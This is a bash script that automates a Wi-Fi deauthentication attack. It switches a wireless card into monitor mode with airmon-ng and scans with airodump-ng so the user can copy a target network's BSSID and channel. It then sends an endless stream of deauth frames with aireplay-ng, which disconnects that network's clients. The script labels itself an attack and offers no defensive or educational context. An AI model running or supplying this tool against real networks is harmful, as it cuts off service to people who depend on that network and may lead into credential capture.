#!/bin/bash
CYAN='\033[0;36m'
BLUE='\033[0;34m'
RED='\033[1;31m'
GREEN='\033[0;32m'

#Initializing
echo "Identifying Network Mode ....."
netMode=$(iwconfig wlan0 |grep 'wlan0\|wlan0mon' | awk '{print $1}')
#Switching Mode
echo "$netMode detected"
echo "Activating Monitor Mode ......"
 if [ $netMode==wlan0 ]
   then
     sudo airmon-ng check kill   
     sudo airmon-ng start wlan0 
     sudo airmon-ng |grep wlan0 | awk '{print $2}'
     echo -e ${RED}"Monitor Mode Successfully Activated"
 fi
#opening airodump-ng
echo -e ${CYAN}"ENSURE!! to Copy BSSID, ESSID and Channel of Target.
Use Ctrl+Shift+C to Copy
Press Ctrl-C to proceed afterwards"
sleep 0.1
sudo gnome-terminal --geometry=100x17+1080+20 -x sh -c "airodump-ng wlan0mon;bash" | awk '{print}'
 echo -e ${GREEN}"Let the Phasing Begin (^_^) !!"
#collect BSSID,ESSID,CHANNEL
 read -p 'BSSID: ' bSSID
 read -p 'Channel: ' chan
 read -p 'ESSID: ' eSSID
 echo $bSSID $eSSID $chan
sudo iwconfig wlan0mon channel $chan
#Trapping Ctrl+C
function ctrl_c(){
    echo -e ${CYAN}"**** Ending Attack ****"
    sudo iwconfig wlan0mon channel auto
       ./wlan0.sh
       }
    
    trap ctrl_c INT
sudo aireplay-ng --deauth 0 -a $bSSID wlan0mon
 
 

